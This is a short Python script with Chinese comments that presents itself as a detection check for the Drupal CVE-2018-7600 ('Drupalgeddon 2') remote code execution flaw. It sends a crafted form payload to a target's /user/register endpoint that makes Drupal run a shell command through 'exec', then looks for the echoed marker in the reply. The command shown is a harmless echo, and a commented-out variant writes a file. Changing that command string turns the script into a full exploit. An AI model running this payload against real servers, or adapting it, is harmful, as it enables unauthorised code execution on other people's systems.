#!/usr/bin/env python3
# coding:utf-8
# Drupal 漏洞检测脚本
# author：ske
# usage: python3 CVE-2018-7600.py http://xxx.xxx.xxx.xxx:8080
# 好像有个bug，利用检测脚本是时候，输入的url末尾不要带有/， 比如[X] "http://xxx.xxx.xxx.xxx:8080/"
import requests
import sys

target = sys.argv[1]
# commands = r'echo "test CVE-2018-7600" | tee test_drupal.txt'       # 在根目录下生成test_drupal.txt文件
commands = 'echo 1111111111111111111'
url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': '{}'.format(commands)}
html_text = requests.post(url, data=payload).text

if '1111111111111111111' in html_text:
    print('[+] [{}] 存在Drupal geddon 2 远程代码执行漏洞(CVE-2018-7600)'.format(target))
else:
    print('[-] [{}] 不存在Drupal geddon 2 远程代码执行漏洞(CVE-2018-7600)'.format(target))


